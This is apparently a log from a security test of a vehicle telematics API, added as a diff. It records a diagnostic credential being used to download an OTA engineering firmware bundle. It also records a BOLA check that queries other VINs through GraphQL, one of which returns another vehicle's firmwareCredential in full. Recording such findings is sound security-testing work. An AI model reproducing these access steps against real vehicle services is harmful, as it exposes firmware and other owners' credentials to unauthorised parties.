@@ -1,0 +1,24 @@
+=== 0193: VERIFY the working recipe (diag:<firmwareCredential>) ===
+
+--- GET http://10.225.139.3:8080/api/v1/ota/engineering-bundle  with Basic diag:<cred> ---
+HTTP/1.1 200 OK
+Content-Disposition: attachment; filename="cv6-engineering-bundle.zip"
+Content-Type: application/zip
+Date: Sat, 14 Nov 2026 02:12:43 GMT
+Transfer-Encoding: chunked
+
+  size=19625  sha256=74b4e6b5b7a4053ad965a588b5b842e862d83a8d7673e114bbaae3f7942bae14
+
+--- control: Basic <cred>:<cred> ---
+  status=401
+--- control: Basic firmare:<cred> ---
+  status=401
+
+--- BOLA check: same GraphQL op with OTHER vins ---
+  vin=CV622697F82A936A1    {"data":{"vehicleDiagnostics":{"campaignId":"CAMP-243892C376D4CB2D5F826953","diagnosticEndpoint":"https://tbox:8443","firmwareCredential":"5e7f07b4a81153ecd5868cc02557f823","firmwareDownload":"/api/v1
+  vin=CV6000000DEMO0001    {"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}
+
+  vin=CV6FF52FEE9EDDD86    {"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}
+
+  vin=CV6000000000000001   {"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}
+
